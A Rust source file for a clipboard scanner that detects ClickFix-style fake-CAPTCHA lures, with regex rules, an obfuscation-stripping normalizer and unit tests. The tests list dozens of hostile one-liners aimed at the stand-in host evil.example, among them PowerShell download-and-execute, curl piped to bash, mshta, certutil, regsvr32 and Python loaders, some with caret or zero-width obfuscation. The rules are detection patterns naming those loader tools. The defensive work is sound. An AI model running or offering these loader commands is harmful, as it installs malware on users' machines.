//! ClickFix / FileFix / TerminalFix detection.
//!
//! Every rule is meant to be high confidence: it should match what a fake CAPTCHA page
//! copies to the clipboard and almost never match what a person copies on purpose.
//! Rule ids are shared with the server dashboard, so keep them stable.

use regex::Regex;
use std::sync::LazyLock;

pub struct Rule {
    pub id: &'static str,
    pub why: &'static str,
    test: Box<dyn Fn(&str) -> bool + Send + Sync>,
}

pub struct Verdict {
    pub rule: &'static str,
    pub why: &'static str,
}

pub const MAX_ANALYZED_CHARS: usize = 20_000;

const PS: &str = r"\b(?:powershell|pwsh)(?:\.exe)?\b";

fn re(src: &str) -> Regex {
    Regex::new(&format!("(?i){src}")).expect("rule regex")
}

fn one(src: &str) -> Box<dyn Fn(&str) -> bool + Send + Sync> {
    let r = re(src);
    Box::new(move |t| r.is_match(t))
}

fn all(srcs: &[&str]) -> Box<dyn Fn(&str) -> bool + Send + Sync> {
    let rs: Vec<Regex> = srcs.iter().map(|s| re(s)).collect();
    Box::new(move |t| rs.iter().all(|r| r.is_match(t)))
}

fn any(srcs: &[&str]) -> Box<dyn Fn(&str) -> bool + Send + Sync> {
    let rs: Vec<Regex> = srcs.iter().map(|s| re(s)).collect();
    Box::new(move |t| rs.iter().any(|r| r.is_match(t)))
}

/// A shell, however it is spelled: `bash`, `/bin/sh`, `env bash`, `/usr/bin/env zsh`.
const SHELL: &str = r"(?:(?:/usr)?/bin/)?(?:env\s+(?:-\S+\s+)*)?(?:(?:/usr)?/bin/)?(?:ba|z|da|k|a)?sh\b";

const SHELLY: &str = r"\b(?:powershell|pwsh|mshta|cmd|curl|wget|iex|bash|zsh|sh|osascript|certutil|bitsadmin|rundll32|regsvr32|wscript|cscript|msiexec|python3?)\b";

pub static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    vec![
        Rule {
            id: "run-dialog-instruction",
            why: "The text tells you to press Win+R or open Terminal and paste. Legitimate software never asks that.",
            test: all(&[
                r"(?:win(?:dows)?\s*\+\s*r|\bwin\+r\b|open (?:the )?(?:run|terminal|powershell)|press\s+(?:enter|ctrl\s*\+\s*v)|paste (?:this|the following)|hit enter to (?:verify|continue|fix))",
                SHELLY,
            ]),
        },
        Rule {
            id: "clickfix-marker",
            why: "Text mentions a CAPTCHA or 'not a robot' check next to a shell command. That is the ClickFix lure verbatim.",
            test: all(&[r"(?:not a robot|verification (?:id|code|step)|ray id|cloudflare|captcha|human verification)", SHELLY]),
        },
        Rule {
            id: "powershell-hidden",
            why: "PowerShell asked to run with a hidden window. Nothing legitimate needs you to paste that.",
            test: one(&format!(r"{PS}[^\n]*\s-(?:w|win|windowstyle)\s*h(?:idden)?\b")),
        },
        Rule {
            id: "powershell-encoded",
            why: "PowerShell running a base64-encoded command. Encoding exists here only to hide what it does.",
            test: one(&format!(r#"{PS}[^\n]*\s-(?:e|ec|en|enc|encodedcommand)\s+["']?[A-Za-z0-9+/=]{{20,}}"#)),
        },
        Rule {
            id: "powershell-bypass",
            why: "PowerShell told to bypass the execution policy.",
            test: one(&format!(r"{PS}[^\n]*\s-(?:ep|ex|exec|executionpolicy)\s+bypass\b")),
        },
        Rule {
            id: "powershell-download-exec",
            why: "Downloads code from the internet and executes it in memory.",
            test: all(&[
                r"\b(?:iex|invoke-expression)\b",
                r"(?:downloadstring|downloadfile|invoke-webrequest|\biwr\b|\birm\b|invoke-restmethod|net\.webclient|start-bitstransfer|\[uri\]|https?://)",
            ]),
        },
        Rule {
            id: "mshta-remote",
            why: "mshta launching a remote or inline script. A classic malware loader.",
            test: one(r#"\bmshta(?:\.exe)?\s+["']?(?:https?:|javascript:|vbscript:|\\\\|[A-Za-z]:\\)"#),
        },
        Rule {
            id: "msiexec-remote",
            why: "Windows Installer pulling a package straight from a URL, silently.",
            test: one(r#"\bmsiexec(?:\.exe)?\b[^\n]*/(?:i|package|q[nb]?)\s*["']?https?://"#),
        },
        Rule {
            id: "curl-pipe-shell",
            why: "Downloads a script and pipes it straight into a shell.",
            test: one(&format!(r"\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?{SHELL}")),
        },
        Rule {
            id: "shell-c-curl",
            why: "Runs a shell on whatever a download returns.",
            test: one(&format!(r#"{SHELL}\s+-c\s+["']?\$\((?:curl|wget)\b"#)),
        },
        Rule {
            id: "base64-decode-shell",
            why: "Decodes hidden base64 and executes it.",
            test: any(&[
                &format!(r"base64\s+(?:-d|--decode|-D)\b[^|\n]*\|\s*(?:sudo\s+)?{SHELL}"),
                r#"echo\s+["']?[A-Za-z0-9+/=]{40,}["']?\s*\|\s*base64"#,
            ]),
        },
        Rule { id: "certutil-urlcache", why: "certutil abused as a downloader.", test: one(r"\bcertutil(?:\.exe)?\b[^\n]*-urlcache") },
        Rule { id: "bitsadmin-transfer", why: "bitsadmin abused as a downloader.", test: one(r"\bbitsadmin(?:\.exe)?\s+/transfer\b") },
        Rule {
            id: "cmd-chained-loader",
            why: "cmd.exe chaining into a known loader binary.",
            test: one(r"\bcmd(?:\.exe)?\s+/[ckCK]\s+[^\n]*\b(?:powershell|pwsh|mshta|curl|certutil|bitsadmin|rundll32|regsvr32|wscript|cscript)\b"),
        },
        Rule { id: "regsvr32-remote", why: "regsvr32 loading a remote scriptlet (Squiblydoo).", test: one(r"\bregsvr32(?:\.exe)?\b[^\n]*/i:https?:") },
        Rule { id: "rundll32-remote", why: "rundll32 executing remote or scripted content.", test: one(r"\brundll32(?:\.exe)?\b[^\n]*(?:https?:|javascript:|\\\\)") },
        Rule { id: "osascript-shell", why: "AppleScript being used to run a shell command or download.", test: one(r"\bosascript\b[^\n]*(?:do shell script|curl|wget|https?://)") },
        Rule {
            id: "filefix-path-comment",
            why: "A command disguised as a file path (FileFix). Pasting this into the Explorer address bar runs it.",
            test: one(r"\b(?:powershell|pwsh|cmd|mshta|wscript|cscript)\b[^\n]*#\s*[A-Za-z]:\\"),
        },
        Rule {
            id: "python-inline-loader",
            why: "Inline Python fetching and executing remote code.",
            test: one(r#"\bpython3?(?:\.exe)?\s+-c\s+["'][^\n]*\b(?:urllib|urlopen|requests\.get|exec\(|socket\.|subprocess)\b"#),
        },
    ]
});

/// Undo the tricks ClickFix pages use to slip past both the eye and a naive regex.
/// We match on this cleaned copy but always wipe the user's original clipboard.
pub fn normalize(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for ch in text.chars() {
        match ch {
            '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2064}' | '\u{FEFF}' => {}
            '\u{00A0}' | '\u{2000}'..='\u{200A}' | '\u{3000}' => out.push(' '),
            '\u{201C}' | '\u{201D}' => out.push('"'),
            '\u{2018}' | '\u{2019}' => out.push('\''),
            '^' | '`' => {}
            c => out.push(c),
        }
    }
    static CONCAT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"["']\s*[+,]\s*["']"#).unwrap());
    CONCAT.replace_all(&out, "").into_owned()
}

/// First matching rule, or None when the clipboard looks harmless.
///
/// Oversized input is not declared clean: a command with junk appended is still a
/// command. We scan the head, where a pasted command starts, and the tail, where a
/// lure's trailing text sits.
pub fn analyze(text: &str) -> Option<Verdict> {
    if text.is_empty() {
        return None;
    }
    let t = normalize(text);
    let windows: Vec<&str> = if t.chars().count() <= MAX_ANALYZED_CHARS {
        vec![&t]
    } else {
        let head_end = t.char_indices().nth(MAX_ANALYZED_CHARS).map(|(i, _)| i).unwrap_or(t.len());
        let tail_start = t.char_indices().rev().nth(4_000).map(|(i, _)| i).unwrap_or(0);
        vec![&t[..head_end], &t[tail_start..]]
    };
    RULES.iter().find(|r| windows.iter().any(|w| (r.test)(w))).map(|r| Verdict { rule: r.id, why: r.why })
}

#[cfg(test)]
mod tests {
    use super::*;

    // Shapes lifted from public ClickFix / FileFix / TerminalFix write-ups. Same list as the server-side tests.
    const MALICIOUS: &[(&str, &str)] = &[
        ("powershell -w hidden -c \"iwr http://x.example/a.ps1 | iex\" # ✅ ''I am not a robot - reCAPTCHA Verification ID: 7811''", "clickfix-marker"),
        ("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$u='https://evil.example/l.txt';iex (New-Object Net.WebClient).DownloadString($u)\"", "powershell-hidden"),
        ("PowerShell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "powershell-hidden"),
        ("pwsh -ep bypass -c \"irm https://evil.example/x | iex\"", "powershell-bypass"),
        ("powershell -EncodedCommand aWV4IChpd3IgaHR0cDovL2V2aWwuZXhhbXBsZS94KQ==", "powershell-encoded"),
        ("mshta https://evil.example/verify.hta", "mshta-remote"),
        ("mshta \"javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -c ...')\"", "mshta-remote"),
        ("cmd /c \"start /min powershell -NoP -c Get-Content C:\\Users\\Public\\v.txt\"", "cmd-chained-loader"),
        ("curl -fsSL https://evil.example/mac | bash", "curl-pipe-shell"),
        ("/bin/bash -c \"$(curl -fsSL https://evil.example/install.sh)\"", "shell-c-curl"),
        ("echo 'Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9hIHwgYmFzaAo=' | base64 -d | bash", "base64-decode-shell"),
        ("certutil.exe -urlcache -split -f http://evil.example/a.exe a.exe && a.exe", "certutil-urlcache"),
        ("bitsadmin /transfer job /download /priority high http://evil.example/a.exe %temp%\\a.exe", "bitsadmin-transfer"),
        ("regsvr32 /s /n /u /i:https://evil.example/a.sct scrobj.dll", "regsvr32-remote"),
        ("osascript -e 'do shell script \"curl -s https://evil.example/p | sh\"'", "curl-pipe-shell"),
        ("powershell -c \"iwr evil.example/f -o $env:tmp\\f.exe;start $env:tmp\\f.exe\" # C:\\Users\\Public\\Downloads\\report.pdf", "filefix-path-comment"),
        ("python3 -c \"import urllib.request as u;exec(u.urlopen('https://evil.example/p').read())\"", "python-inline-loader"),
        ("c^m^d /c p^o^w^e^r^s^h^e^l^l -c \"iex(irm https://evil.example/x)\"", "powershell-download-exec"),
        ("p`o`w`e`r`s`h`e`l`l -w hidden -c whoami", "powershell-hidden"),
        ("\"p\"+\"owershell\" -w hidden -c whoami", "powershell-hidden"),
        ("To continue, open Terminal and paste: bash -c \"whoami\"", "run-dialog-instruction"),
        ("power\u{200B}shell -w hid\u{200B}den -c \"iex(iwr http://evil.example/x)\"", "powershell-hidden"),
        ("powershell -w hidden -c \u{201C}iex (irm https://evil.example/x)\u{201D}", "powershell-hidden"),
        ("Press Win+R, paste and hit Enter to verify you are human: msiexec /i http://evil.example/verify.msi /qn Cloudflare Verification", "run-dialog-instruction"),
        ("curl -fsSL https://evil.example/script | env bash", "curl-pipe-shell"),
        ("wget -qO- https://evil.example/script | /usr/bin/env sh", "curl-pipe-shell"),
        ("curl -s https://evil.example/s | sudo /bin/bash", "curl-pipe-shell"),
        ("/usr/bin/env bash -c \"$(curl -fsSL https://evil.example/i.sh)\"", "shell-c-curl"),
    ];

    const BENIGN: &[&str] = &[
        "Hello, can you send me the report by Friday?",
        "https://github.com/hono/hono",
        "npm install hono @hono/node-server",
        "git commit -m \"fix: handle empty clipboard\"",
        "SELECT * FROM users WHERE id = 1;",
        "const x = await fetch(url); console.log(await x.json());",
        "powershell Get-Process | Sort-Object CPU -Descending | Select -First 5",
        "ls -la ~/Downloads",
        "docker run --rm -it -p 8080:8080 nginx",
        "ssh deploy@10.0.0.4",
        "curl -s https://api.example.com/v1/status",
        "brew install node",
        "python3 -c \"print(2**10)\"",
        "I am not a robot, I promise. See you at the CAPTCHA-themed party!",
        "echo hello | base64",
        "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
        "kubectl get pods -n prod",
    ];

    #[test]
    fn known_clickfix_shapes_are_blocked_with_the_expected_rule() {
        for (sample, rule) in MALICIOUS {
            let v = analyze(sample).unwrap_or_else(|| panic!("expected a verdict for: {sample}"));
            assert_eq!(v.rule, *rule, "wrong rule for: {sample}");
        }
    }

    #[test]
    fn ordinary_clipboard_contents_are_left_alone() {
        for sample in BENIGN {
            assert!(analyze(sample).is_none(), "false positive on: {sample}");
        }
        let prose = "The quick brown fox jumps over the lazy dog. ".repeat(50);
        assert!(analyze(&prose).is_none());
    }

    #[test]
    fn padding_does_not_hide_a_command() {
        let padded_front = format!("powershell -w hidden -c whoami # {}", "x".repeat(30_000));
        assert_eq!(analyze(&padded_front).map(|v| v.rule), Some("powershell-hidden"));
        let padded_back = format!("{}\ncurl -fsSL https://evil.example/s | bash", "x".repeat(30_000));
        assert_eq!(analyze(&padded_back).map(|v| v.rule), Some("curl-pipe-shell"));
        let big_benign = "The quick brown fox jumps over the lazy dog. ".repeat(2_000);
        assert!(analyze(&big_benign).is_none());
    }

    #[test]
    fn normalize_strips_invisible_characters_and_unifies_quotes() {
        assert_eq!(normalize("a\u{200B}b\u{2019}c\u{00A0}d"), "ab'c d");
        assert_eq!(normalize("\"p\"+\"owershell\""), "\"powershell\"");
    }
}
